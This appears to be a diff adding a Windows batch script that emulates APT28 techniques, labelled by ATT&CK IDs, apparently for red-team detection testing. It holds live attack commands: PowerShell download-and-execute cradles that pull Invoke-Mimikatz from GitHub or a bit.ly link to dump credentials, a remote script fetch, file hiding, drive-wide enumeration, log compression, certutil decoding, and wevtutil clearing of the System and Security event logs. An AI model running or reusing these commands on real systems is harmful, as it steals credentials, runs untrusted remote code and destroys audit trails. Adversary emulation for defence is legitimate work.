@@ -1,0 +1,87 @@
+:: T1119
+:: Automated Collection
+
+:: T1067
+:: Bootkit
+
+
+:: T1122
+:: Component Object Model Hijacking
+
+:: T1059
+:: Command-Line Interface
+
+:: T1086
+:: PowerShell
+:: T1003
+:: Credential Dumping
+
+:: Live Fire
+:: powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"
+
+:: Simulation
+powershell.exe "(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');IEX ((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))); invoke-mimikatz -dumpcr"
+
+:: T1074
+:: Data Staged
+
+"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/ARTifacts/Misc/Discovery.bat')" > c:\windows\pi.log
+
+
+:: T1158
+:: Hidden Files and Directories
+
+attrib.exe +h C:\Windows\pi.log
+
+
+:: T1083
+:: File and Directory Discovery
+
+dir /s c:\ >> %temp%\download
+dir /s "c:\Documents and Settings" >> %temp%\download
+dir /s "c:\Program Files\" >> %temp%\download
+dir /s d:\ >> %temp%\download
+dir "%systemdrive%\Users\*.*" >> %temp%\download
+dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
+dir "%userprofile%\Desktop\*.*" >> %temp%\download
+tree /F >> %temp%\download
+
+:: T1002
+:: Data Compressed
+
+dir c:\windows\*.log -Recurse | Compress-Archive -DestinationPath c:\temp\data.zip
+
+:: T1005
+:: Data from Local System
+forfiles
+
+:: T1001
+:: Data Obfuscation
+:: APT28 added "junk data" to each encoded string, preventing trivial decoding without knowledge of the junk removal algorithm. Each implant was given a "junk length" value when created, tracked by the controller software to allow seamless communication but prevent analysis of the command protocol on the wire.[4]
+
+:: T1140
+:: Deobfuscate/Decode Files or Information
+:: An APT28 macro uses the command certutil -decode to decode contents of a .txt file storing the base64 encoded payload
+certutil -decode
+
+
+:: T1107
+:: File Deletion
+
+:: T1070
+:: Indicator Removal on Host
+cmd /c wevtutil.exe cl System
+cmd /c wevtutil.exe cl Security
+
+:: T1056
+:: Input Capture
+
+:: T1040
+:: Network Sniffing
+:: APT28 deployed the open source tool Responder to conduct NetBIOS Name Service poisoning, which captured usernames and hashed passwords that allowed access to legitimate credentials.[4][23]
+
+
+::T1057
+:: Process Discovery
+:: An APT28 loader Trojan will enumerate the victim's processes searching for explorer.exe if its current process does not have necessary permissions.[26]
+tasklist.exe | findstr explorer.exe
